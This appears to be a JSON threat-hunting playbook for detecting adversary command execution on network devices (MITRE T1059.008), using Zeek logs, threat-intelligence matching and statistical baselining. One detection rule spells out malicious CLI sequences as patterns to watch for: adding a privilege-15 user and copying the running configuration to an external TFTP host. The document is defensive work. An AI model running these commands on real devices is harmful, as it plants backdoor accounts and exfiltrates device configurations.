```json
[
  {
    "Is the adversary executing commands on network devices? (TA0002 - Execution)": {
      "Indicators": {
        "T1059.008 - Network Device CLI": {
          "Connections to network device management interfaces from known malicious IP addresses, or command execution containing high-confidence signatures of exploits or malware.": {
            "Data": "Zeek conn.log; Zeek syslog.log",
            "Data Platform": "Network devices",
            "NAI": "Insert site-specific NAI here",
            "Action": "Continuously correlate source IP addresses from Zeek connection logs (conn.log, ssh.log) targeting device management ports (e.g., 22, 23) against a cyber threat intelligence feed of known malicious infrastructure, updated daily. Additionally, scan raw network device syslog content, captured via Zeek syslog.log or a SIEM, for specific strings or regular expressions that match known exploits, malware artifacts (e.g., filenames dropped by implants), or commands associated with known adversary toolkits. Alert on any confirmed matches."
          },
          "Execution of specific, ordered sequences of CLI commands on network devices known to be associated with malicious activity, such as disabling security features, creating unauthorized accounts, or setting up data exfiltration channels.": {
            "Data": "Zeek syslog.log",
            "Data Platform": "Network devices",
            "NAI": "Insert site-specific NAI here",
            "Action": "Define and monitor for multi-step command patterns captured in network device syslogs (e.g., via Zeek syslog.log). Create correlation rules to detect malicious sequences within a single administrative session (grouped by source IP and timestamp). Examples include: 1) `configure terminal` -> `username <new_user> privilege 15 secret <password>` -> `line vty 0 4` -> `login local`; or 2) `copy running-config tftp://<external_ip>/config.txt`. Maintain and regularly update a library of known malicious command patterns based on threat intelligence."
          },
          "Anomalous administrative sessions on network devices, characterized by unusual source IP addresses, atypical time of day, abnormal session duration, or connections from hosts not authorized for network administration.": {
            "Data": "Zeek conn.log; Zeek ssh.log; Zeek telnet.log",
            "Data Platform": "Network devices",
            "NAI": "Insert site-specific NAI here",
            "Action": "Establish a baseline of normal administrative access patterns for network devices, including authorized source subnets, typical login hours, and user accounts. Monitor Zeek logs for connections to management ports. Employ statistical analysis (e.g., Inter-Quartile Range (IQR) and box-plots for outlier detection on session duration, Z-scores for time-of-day deviations) to flag anomalous sessions. Use correlation analysis to identify logins originating from non-administrative VLANs or workstations. Implement 'first seen' logic to flag administrative access from a previously unknown source IP, user, or client software version (from Zeek ssh.log)."
          },
          "Unauthorized or suspicious configuration changes on network devices, identified by deviation from established baselines or lack of corresponding change management records.": {
            "Data": "Zeek syslog.log; Configuration Management Database (CMDB) data",
            "Data Platform": "Network devices",
            "NAI": "Insert site-specific NAI here",
            "Action": "Implement automated network device configuration monitoring. Periodically retrieve device configurations and compare them to a version-controlled, known-good baseline using a diff algorithm. Concurrently, monitor device syslogs (e.g., via Zeek syslog.log) for all configuration change events (e.g., Cisco's `%SYS-5-CONFIG_I`). Use correlation analysis to join detected changes with an approved change ticket from a CMDB or ticketing system. Investigate all changes lacking authorization. Use linear regression to model the normal rate of change and flag periods of unusually high change activity."
          },
          "Outbound network connections initiated from a network device to an external or unusual internal destination, suggesting the device is being used as a pivot point or for data exfiltration.": {
            "Data": "Zeek conn.log",
            "Data Platform": "Network devices",
            "NAI": "Insert site-specific NAI here",
            "Action": "Define the IP address ranges of all network infrastructure devices. Filter Zeek conn.log for all connections where the source IP (`id.orig_h`) belongs to these ranges. Establish and enforce a strict baseline of expected outbound destinations for these devices (e.g., NTP servers, syslog collectors, TACACS/RADIUS servers, specific management hosts). Alert on any connection from a network device to a destination IP/port not on the explicit allowlist. Use entropy measures on the set of destination IPs contacted by a device over time; a sudden increase in entropy could signal scanning or other malicious activity."
          }
        }
      },
      "version": "2.0",
      "last_updated": "2025-05-11"
    }
  }
]
```